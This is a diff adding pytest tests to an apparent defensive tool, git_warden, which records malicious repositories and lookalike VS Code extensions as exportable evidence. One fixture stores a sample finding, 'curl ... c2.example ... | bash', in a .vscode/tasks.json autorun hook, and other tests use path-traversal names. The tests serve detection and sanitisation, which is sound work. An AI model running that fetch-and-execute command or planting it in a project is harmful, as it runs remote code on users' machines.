@@ -128,3 +128,89 @@ def test_approved_list_rejects_malformed_keys(tmp_path):
     f = tmp_path / "ok.json"
     f.write_text(json.dumps(["vsmarketplace:a.b", "openvsx:c.d", "../etc", "x:y.z", 7]))
     assert ext_osm._read_only_file(f) == {"vsmarketplace:a.b", "openvsx:c.d"}
+
+
+# --- evidence/ store --------------------------------------------------------
+
+def _add_repo(db, name="evil/dropper"):
+    payload = {"confidence": "auto", "bash_findings": [
+        {"file": ".vscode/tasks.json", "line": 0, "category": "install_hook",
+         "rule": "vscode-autorun",
+         "snippet": "curl -s https://c2.example/settings/linux?flag=9 | bash"}]}
+    db.conn.execute(
+        "INSERT INTO repo_findings (full_name, url, detection_method, status, score, "
+        "raw_payload, matched_iocs) VALUES (?,?,?,?,?,?,?)",
+        (name, f"https://github.com/{name}", "signature_match", "confirmed", 9,
+         json.dumps(payload), json.dumps(['"/settings/linux?flag=" filename:tasks.json'])))
+    db.conn.commit()
+
+
+def _csv(path):
+    import csv
+    with (path / "findings.csv").open(newline="", encoding="utf-8") as fh:
+        return {r["key"]: r for r in csv.DictReader(fh)}
+
+
+def test_evidence_lists_every_finding_with_all_columns(db, tmp_path):
+    from git_warden.evidence import COLUMNS, export
+    _add_repo(db)
+    out = tmp_path / "evidence"
+    export(db, out)
+    rows = _csv(out)
+    assert set(rows) == {"repository:evil/dropper",
+                         "vsmarketplace:prettier-team.prettier-vscode",
+                         "openvsx:someone.theme"}
+    repo = rows["repository:evil/dropper"]
+    assert list(repo) == COLUMNS
+    assert repo["c2_hosts"] == "c2.example"
+    assert repo["rules"] == "install_hook/vscode-autorun"
+    assert "filename:tasks.json" in repo["matched_signatures"]
+    detail = json.loads((out / repo["evidence_file"]).read_text())
+    assert detail["evidence"][0]["file"] == ".vscode/tasks.json"
+    assert detail["osm_report"]["resource_identifier"] == "https://github.com/evil/dropper"
+
+
+def test_evidence_keeps_hand_edits_and_old_rows(db, tmp_path):
+    import csv
+
+    from git_warden.evidence import COLUMNS, export
+    out = tmp_path / "evidence"
+    export(db, out)
+    rows = _csv(out)
+    key = "vsmarketplace:prettier-team.prettier-vscode"
+    rows[key]["reviewer_decision"] = "reject"
+    rows[key]["notes"] = "lookalike, confirmed by hand"
+    rows["repository:gone/repo"] = {c: "" for c in COLUMNS} | {
+        "key": "repository:gone/repo", "kind": "repository", "notes": "keep me"}
+    with (out / "findings.csv").open("w", newline="", encoding="utf-8") as fh:
+        w = csv.DictWriter(fh, fieldnames=COLUMNS)
+        w.writeheader()
+        w.writerows(rows.values())
+    export(db, out)  # a later run
+    again = _csv(out)
+    assert again[key]["reviewer_decision"] == "reject"
+    assert again[key]["notes"] == "lookalike, confirmed by hand"
+    assert again["repository:gone/repo"]["notes"] == "keep me"  # never dropped
+
+
+def test_reviewer_reject_keeps_an_extension_out_of_the_preview(db, tmp_path):
+    report, _ = _run(db, tmp_path, dry_run=True,
+                     rejected={"vsmarketplace:prettier-team.prettier-vscode"})
+    assert report["validated"] == []
+
+
+def test_evidence_marks_preview_and_records_the_body(db, tmp_path):
+    from git_warden.evidence import export
+    report, _ = _run(db, tmp_path, dry_run=True)
+    out = tmp_path / "evidence"
+    export(db, out, preview=report["previews"])
+    row = _csv(out)["vsmarketplace:prettier-team.prettier-vscode"]
+    assert row["osm_status"] == "awaiting_approval"
+    detail = json.loads((out / row["evidence_file"]).read_text())
+    assert detail["osm_report"]["report_type"] == "package"
+
+
+def test_evidence_file_names_are_safe(db, tmp_path):
+    from git_warden.evidence import _safe_name
+    assert _safe_name("../../etc/passwd") == "etc_passwd"
+    assert _safe_name("vsmarketplace:a.b") == "vsmarketplace_a.b"
